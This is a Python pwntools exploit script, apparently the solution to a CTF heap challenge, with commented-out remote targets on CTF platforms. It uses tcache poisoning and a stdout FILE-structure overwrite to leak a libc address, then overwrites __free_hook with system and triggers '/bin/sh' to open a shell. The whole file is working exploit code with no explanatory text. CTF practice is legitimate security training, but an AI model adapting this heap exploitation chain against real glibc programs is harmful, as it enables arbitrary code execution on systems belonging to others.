from pwn import *
context.arch='amd64'
elf=ELF('./pwn')
#libc=ELF('./libc-2.27.so')
libc=elf.libc
#io=remote('node5.buuoj.cn',28139)
io=process('./pwn')
#io=remote('hnctf.imxbt.cn',53355)


def add(size,content):
    io.recvuntil(b">> ")
    io.sendline(b'1')
    #io.recvuntil(b"Size?\n")
    io.recv()
    io.sendline(str(size).encode())
    #io.recvuntil(b"Content?\n")
    io.recv()
    io.send(content)

def free():
    io.recvuntil(b">> ")
    io.sendline(b'1')
    #io.recvuntil(b'Size?\n')
    io.recv()
    io.sendline(b'0')


def delete():
    io.recvuntil(b">> ")
    io.sendline(b'2')

def show(idx):
    io.recvuntil(b"3. Renew secret\n")
    io.sendline(b'3')
    io.recvuntil(b"please enter idx:\n")
    io.sendline(str(idx).encode())

def edit(num,content) :
    io.recvuntil(b"3. Renew secret\n")
    io.sendline(b'3')
    io.recvuntil(b"2. Big secret\n")
    io.sendline(str(num).encode())
    io.recvuntil(b"Tell me your secret: \n")
    io.send(content)

add(0x30,b'aa')
free()
add(0x80,b'a')
free()
add(0x40,b'a')
free()
add(0x80,b'a')
for i in range(7):
    delete()
free()
#gdb.attach(io)
#pause()
add(0x30,b'a')
payload=p64(0)*7+p64(0x51)+b'\x60'+b'\xc7'
add(0x50,payload)
free()
add(0x80,b'aa')
free()
payload=p64(0xfbad1800)+p64(0)*3+b'\x88'
add(0x80,payload)
libc_base=u64(io.recv(6).ljust(8,b'\x00'))-0x3ec7e3
print('libc_base:',hex(libc_base))
system=libc_base+libc.sym['system']
free_hook=libc_base+libc.sym['__free_hook']
print('system:',hex(system))
print('free_hook:',hex(free_hook))
io.recvuntil(b">> ")
io.sendline(b'666')
#io.interactive()
add(0x70,b'a')
free()
add(0xa0,b'a')
free()
add(0x90,b'a')
free()
add(0xa0,b'a')
for i in range(7):
    delete()
free()
add(0x70,b'a')
payload=p64(0)*15+p64(0x71)+p64(free_hook-0x8)
add(0x90,payload)
free()
add(0xa0,b'a')
free()
add(0xa0,b'/bin/sh\x00'+p64(system))
#gdb.attach(io)
#pause()
delete()
io.interactive()



